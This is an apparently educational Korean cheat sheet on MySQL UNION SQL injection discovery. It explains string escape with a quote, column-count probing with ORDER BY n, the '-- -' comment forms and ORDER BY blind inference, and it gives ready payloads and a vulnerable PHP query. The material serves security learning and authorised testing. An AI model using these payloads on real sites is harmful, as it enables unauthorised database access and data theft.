# MySQL SQLi PoC: 문자열 탈출·컬럼 수 탐침·주석

- `'`로 열려 있는 문자열을 일찍 닫고, `ORDER BY n`으로 결과 컬럼 수를 확정하고, `-- -`로 잔여 쿼리를 주석 처리하는 UNION SQLi PoC 3요소의 원리
- LIKE 같은 문자열 컨텍스트 인젝션 포인트를 발견한 직후, UNION SELECT로 데이터를 뽑기 전에 컬럼 수를 먼저 확정해야 할 때
- 서버가 입력을 따옴표로 감싼 문자열 안에 그대로 붙여야 하고(prepared statement면 무효), DBMS가 MySQL이어야 한다(`--` 뒤 공백 필수). 화면의 정렬 성공/에러 차이로 n을 판정한다

## 개요

UNION SQLi의 진입이 되는 세 가지다. 발견과 판정(PoC) 단계의 지식이고, 이걸로 데이터를 뽑는 추출 단계는 [UNION 추출 치트시트](./mysql_union_sqli.md)에서 다룬다.

- `'`: 열려 있는 문자열을 일찍 닫아 SQL 문법 영역으로 탈출
- `ORDER BY n`: 결과 컬럼 수 탐침
- `-- -`: 원래 쿼리의 남은 부분 주석 처리

## 인젝션 포인트와 문자열 탈출

서버 쿼리가 입력을 문자열 안에 그대로 붙이는 지점이 인젝션 포인트다.

```php
$sql = "SELECT * FROM employees
        WHERE first_name LIKE '%$first_name%' AND last_name LIKE '%$last_name%'";
```

입력은 이미 따옴표로 감싸인 문자열 안쪽에 들어간다. 그래서 `'`는 새 문자열을 여는 게 아니라 열려 있는 문자열을 일찍 닫는 동작이다.

`first_name`에 `' ORDER BY 5-- -`를 넣으면 쿼리가 이렇게 조립된다.

```sql
SELECT * FROM employees WHERE first_name LIKE '%' ORDER BY 5-- -%' AND last_name LIKE '%%'
```

- `LIKE '%'`: 입력의 `'`가 문자열을 닫음. 조건 하나 완성
- `ORDER BY 5`: 문자열이 끝났으므로 이후 입력이 SQL 문법으로 해석됨
- `-- -`: 개발자가 붙인 원래 잔여부 `%' AND ...`를 버림

뒤에 `'`를 또 붙이면 안 닫힌 따옴표가 하나 더 생겨 문법 에러가 난다. 닫을 문자열을 우리가 여는 게 아니라 이미 열린 것을 닫는 것이므로 앞에만 붙인다.

## 컬럼 수 탐침: ORDER BY n

`ORDER BY n`은 n번째 컬럼 기준 정렬이고, n번째 컬럼이 없으면 MySQL이 에러를 낸다. 이를 개수 탐침으로 쓴다.

- `' ORDER BY 4-- -`: 4컬럼 존재, 정상 (화면 관찰: 정렬된 목록 출력)
- `' ORDER BY 5-- -`: 5번째 컬럼 없음, 에러 (화면 관찰: 결과 0건)

UNION SELECT는 앞 SELECT와 컬럼 수가 같아야만 작동하므로 이 값이 먼저 필요하다.

```sql
SELECT a,b,c,d FROM employees UNION SELECT 1,2,3     -- 에러
SELECT a,b,c,d FROM employees UNION SELECT 1,2,3,4   -- 성공
```

## 주석: 왜 `-- -` 형태인가

MySQL에서 `--`는 뒤에 공백(또는 제어 문자)이 있어야만 주석으로 인정된다.

```sql
SELECT 10-- 1   -- 주석. 10 출력
SELECT 10--1    -- 주석 아님. 10 - (-1) = 11 로 해석
```

`price--price` 같은 이중 음수 연산과의 충돌을 막으려는 MySQL 설계다. 오라클·MSSQL은 이런 제약이 없어 `--`만으로 주석이다.

한편 URL에서는 주석이 입력 끝에 오면 공백이 마지막 글자가 되는데, 끝 공백은 브라우저·서버·복붙 과정에서 잘려나가기 쉽다. 공백이 사라지면 `--`만 남아 이중 음수로 해석되고 쿼리가 깨진다. 그래서 공백 뒤에 유실돼도 무해한 글자를 붙여 공백이 끝에 오지 않게 고정한다.

```
-- -  =  "--"(주석 시작) + " "(MySQL 필수 공백) + "-"(공백 보호용 더미, 주석 내용일 뿐)
```

- `-- -`: 공백 보호용 더미 `-`를 붙인 가장 흔한 형태
- `--+`: URL에서 `+`는 공백으로 디코딩되므로 `-- `와 동일
- `--%20`: 공백을 명시적으로 인코딩
- `%23`: MySQL `#` 주석. 공백 불필요하나 URL fragment 충돌 때문에 인코딩 필요

## ORDER BY 구문 정리

```sql
SELECT * FROM employees ORDER BY 1;              -- 1번째 컬럼 기준 오름차순
SELECT * FROM employees ORDER BY 3 DESC;         -- 3번째 컬럼 기준 내림차순
SELECT * FROM employees ORDER BY first_name;     -- 컬럼명 기준
SELECT * FROM employees ORDER BY 1,2;            -- 다중 정렬 기준
SELECT * FROM employees ORDER BY 1 ASC, 2 DESC;  -- 방향 지정
```

- 숫자는 SELECT 리스트의 위치(1부터 시작)다. 컬럼명 대신 쓸 수 있어 컬럼 수 탐침에 적합하다.
- `ASC`가 기본값이라 생략 가능하고, `DESC`는 내림차순이다.
- 원래 쿼리에 ORDER BY가 이미 있으면 주입한 구문이 뒤에 붙어 에러가 날 수 있다. 잔여부를 주석으로 잘라낸다.
- UNION과 조합하려면 앞 SELECT의 컬럼 수를 먼저 확정해야 한다.

### 컬럼 수 탐침 절차

```text
' ORDER BY 1-- -    정상
' ORDER BY 2-- -    정상
' ORDER BY 3-- -    정상
' ORDER BY 4-- -    에러 → 컬럼 수는 3
```

- 마지막으로 정상인 n이 컬럼 수다. 에러가 난 n을 컬럼 수로 쓰면 안 된다.
- 에러 대신 빈 화면이나 다른 정렬로 나타나는 경우가 있다. 그때는 `UNION SELECT NULL,...`의 NULL 개수를 늘려가며 확인한다.
- ORDER BY가 필터링되면 `GROUP BY n`이나 `UNION SELECT NULL,NULL,...`으로 우회한다.

### DBMS별 차이

- MySQL: `ORDER BY 1` 위치 참조 지원. `--` 뒤 공백 필수.
- MSSQL: `ORDER BY 1` 지원. `--`만으로 주석 가능.
- PostgreSQL: `ORDER BY 1` 지원. `NULLS FIRST`·`NULLS LAST` 지정 가능.
- Oracle: `ORDER BY 1` 지원. 독립 SELECT에는 `FROM dual` 필요.
- SQLite: `ORDER BY 1` 지원.

### ORDER BY 기반 블라인드 판정

결과 순서를 조건으로 바꿔 참·거짓을 읽는다. 화면에 값이 나오지 않고 목록 순서만 보일 때 쓴다.

```sql
' ORDER BY (CASE WHEN (조건) THEN 1 ELSE 2 END)-- -
' ORDER BY (CASE WHEN (SELECT COUNT(*) FROM users)>5 THEN 1 ELSE 2 END)-- -
```

- 조건이 참이면 1, 거짓이면 2가 되어 정렬이 달라지고 첫 행이 바뀐다.
- CASE WHEN 문법은 [CASE WHEN 치트시트](./case_when_sqli.md) 참조.

## 주의

- 모든 시도는 허가된 대상에서만 실행한다.
